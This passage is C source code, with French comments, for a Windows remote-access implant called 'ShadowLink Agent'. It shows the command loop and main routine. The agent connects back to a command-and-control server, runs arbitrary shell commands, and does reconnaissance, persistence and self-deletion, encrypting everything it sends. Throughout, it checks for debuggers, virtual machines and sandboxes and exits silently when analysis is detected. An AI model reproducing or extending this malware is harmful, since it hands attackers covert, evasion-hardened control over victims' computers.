                send(sock, (char*)encryptedError, encrypted_len, 0);
            } else {
                int reconLen = do_recon(reconBuffer, RECON_BUFFER_SIZE);
                if (reconLen > 0) {
                    printf("[*] Recon complete, sending %d bytes...\n", reconLen);
                    uint8_t *encryptedRecon = (uint8_t*)malloc(RECON_BUFFER_SIZE + 32);
                    if (encryptedRecon) {
                        size_t encrypted_len = aes_encrypt((uint8_t*)reconBuffer, strlen(reconBuffer), encryptedRecon);
                        send(sock, (char*)encryptedRecon, encrypted_len, 0);
                        free(encryptedRecon);
                    }
                } else {
                    const char *errorMsg = "[!] Recon failed\n";
                    uint8_t encryptedError[BUFFER_SIZE];
                    size_t encrypted_len = aes_encrypt((uint8_t*)errorMsg, strlen(errorMsg), encryptedError);
                    send(sock, (char*)encryptedError, encrypted_len, 0);
                }
                free(reconBuffer);
            }
            continue;
        }
        
        // Commande HELP
        if (strcmp((char*)decryptedCommand, "help") == 0) {
            const char *helpMsg = 
                "========================================\n"
                "   SHADOWLINK C2 - COMMANDS (Phase 7)\n"
                "========================================\n"
                "  PROCESS MANAGEMENT:\n"
                "    ps             - List all processes\n"
                "    kill <pid>     - Kill a process by PID\n"
                "\n"
                "  FILE TRANSFER:\n"
                "    download <path> - Download file from agent\n"
                "    upload <path>   - Upload file to agent\n"
                "\n"
                "  RECONNAISSANCE:\n"
                "    recon          - Full system recon\n"
                "\n"
                "  PERSISTENCE:\n"
                "    persist        - Install persistence\n"
                "    unpersist      - Remove persistence\n"
                "    checkpersist   - Check persistence\n"
                "\n"
                "  EVASION:\n"
                "    stealth on/off - Toggle evasion\n"
                "    checksec       - Security checks\n"
                "    selfdestruct   - Delete from disk\n"
                "\n"
                "  CONTROL:\n"
                "    help           - Show this help\n"
                "    exit           - Disconnect (reconnects)\n"
                "    die            - Kill permanently\n"
                "    <cmd>          - Execute shell command\n"
                "========================================\n";
            uint8_t encryptedHelp[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)helpMsg, strlen(helpMsg), encryptedHelp);
            send(sock, (char*)encryptedHelp, encrypted_len, 0);
            continue;
        }
        
        // Commande STEALTH ON/OFF
        if (strcmp((char*)decryptedCommand, "stealth on") == 0) {
            stealth_mode = 1;
            const char *msg = "[+] Stealth mode ENABLED\n";
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)msg, strlen(msg), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            continue;
        }
        
        if (strcmp((char*)decryptedCommand, "stealth off") == 0) {
            stealth_mode = 0;
            const char *msg = "[+] Stealth mode DISABLED\n";
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)msg, strlen(msg), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            continue;
        }
        
        // Commande CHECKSEC - Vérifier la sécurité manuellement
        if (strcmp((char*)decryptedCommand, "checksec") == 0) {
            char msg[2048];
            int debugged = check_debugger_present();
            int timing = check_timing_attack();
            int vm_name = check_suspicious_computername();
            int vm_user = check_suspicious_username();
            int vm_res = check_low_resources();
            int vm_proc = check_vm_processes();
            int fast_exec = detect_fast_execution();
            
            snprintf(msg, sizeof(msg),
                "========================================\n"
                "   SECURITY CHECK RESULTS (Phase 6)\n"
                "========================================\n"
                "  Stealth Mode:       %s\n"
                "  -------- ANTI-DEBUG --------\n"
                "  Debugger Present:   %s\n"
                "  Timing Attack:      %s\n"
                "  -------- ANTI-VM -----------\n"
                "  Suspicious PC:      %s\n"
                "  Suspicious User:    %s\n"
                "  Low Resources:      %s\n"
                "  VM Processes:       %s\n"
                "  -------- ANTI-SANDBOX ------\n"
                "  Fast Execution:     %s\n"
                "  -------- ADVANCED -----------\n"
                "  XOR Encryption:     ACTIVE\n"
                "  API Hashing:        ACTIVE\n"
                "  Self-Delete Ready:  YES\n"
                "========================================\n"
                "  VERDICT: %s\n"
                "========================================\n",
                stealth_mode ? "ENABLED" : "DISABLED",
                debugged ? "DETECTED!" : "OK",
                timing ? "DETECTED!" : "OK",
                vm_name ? "DETECTED!" : "OK",
                vm_user ? "DETECTED!" : "OK",
                vm_res ? "DETECTED!" : "OK",
                vm_proc ? "DETECTED!" : "OK",
                fast_exec ? "DETECTED!" : "OK",
                (debugged || timing || vm_name || vm_user || vm_res || vm_proc || fast_exec) ? 
                    "UNSAFE ENVIRONMENT" : "SAFE");
            
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)msg, strlen(msg), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            continue;
        }
        
        // Commande SELFDESTRUCT - Supprimer l'agent du disque et terminer
        if (strcmp((char*)decryptedCommand, "selfdestruct") == 0) {
            // Retirer la persistance d'abord
            remove_persistence();
            
            const char *msg = "[!] SELF-DESTRUCT INITIATED - Agent will be deleted from disk\n";
            uint8_t encrypted[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)msg, strlen(msg), encrypted);
            send(sock, (char*)encrypted, encrypted_len, 0);
            
            closesocket(sock);
            WSACleanup();
            
            // Lancer la suppression différée
            self_delete();
            
            // Terminer immédiatement
            ExitProcess(0);
        }

        // Commande shell classique
        char outputBuffer[BUFFER_SIZE];
        if (execute_command((char*)decryptedCommand, outputBuffer, sizeof(outputBuffer)) == 0) {
            uint8_t encryptedOutput[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)outputBuffer, strlen(outputBuffer), encryptedOutput);
            send(sock, (char*)encryptedOutput, encrypted_len, 0);
        } else {
            const char *errorMsg = "Failed to execute command\n";
            uint8_t encryptedError[BUFFER_SIZE];
            size_t encrypted_len = aes_encrypt((uint8_t*)errorMsg, strlen(errorMsg), encryptedError);
            send(sock, (char*)encryptedError, encrypted_len, 0);
        }
    }
}


int main() {
    // Seed pour rand()
    srand((unsigned int)time(NULL));
    
    // ============================================
    // ADVANCED EVASION - DELAYED EXECUTION
    // ============================================
    // Attendre avant de faire quoi que ce soit
    // Les sandbox ont souvent un timeout court
    if (stealth_mode) {
        // Vérifier si le temps est accéléré (sandbox)
        if (delayed_execution(INITIAL_DELAY)) {
            // Sandbox détectée - sortie silencieuse
            evasion_exit();
        }
    }
    
    // ============================================
    // EVASION CHECKS AU DÉMARRAGE
    // ============================================
    if (perform_evasion_checks()) {
        // Environnement suspect détecté - sortie silencieuse
        evasion_exit();
    }
    
    printf("[*] ShadowLink Agent - Phase 7 (File Transfer + Process Mgmt)\n");

    WSADATA wsaData; 
    int result = WSAStartup(MAKEWORD(2,2), &wsaData);

    if (result != 0) {
        printf("WSAStartup failed: %d\n", result);
        return 1;
    }
    
    printf("[+] Winsock initialized\n");
    
    int reconnect_delay = RECONNECT_DELAY;
    
    // Boucle de reconnexion infinie
    while (1) {
        // Vérification périodique de l'environnement
        if (perform_evasion_checks()) {
            evasion_exit();
        }
        
        char *server_ip = get_decrypted_server_ip();
        printf("[*] Attempting to connect to %s:%d...\n", server_ip, SERVER_PORT);
        
        SOCKET sock = connect_to_server();
        
        if (sock == INVALID_SOCKET) {
            printf("[-] Connection failed, retrying in %d seconds...\n", reconnect_delay / 1000);
            Sleep(reconnect_delay);
            
            // Backoff exponentiel (double le délai jusqu'au max)
            if (reconnect_delay < MAX_RECONNECT_DELAY) {
                reconnect_delay *= 2;
                if (reconnect_delay > MAX_RECONNECT_DELAY) {
                    reconnect_delay = MAX_RECONNECT_DELAY;
                }
            }
            continue;
        }
        
        // Connexion réussie, reset le délai
        reconnect_delay = RECONNECT_DELAY;
        printf("[+] Connected to server at %s:%d\n", server_ip, SERVER_PORT);
        
        // Boucle de commandes
        command_loop(sock);
        
        // Déconnecté, fermer le socket et réessayer
        closesocket(sock);
        printf("[*] Disconnected, reconnecting in %d seconds...\n", RECONNECT_DELAY / 1000);
        Sleep(RECONNECT_DELAY);
    }

    WSACleanup();
    printf("[*] Agent terminated\n");

    return 0;
}
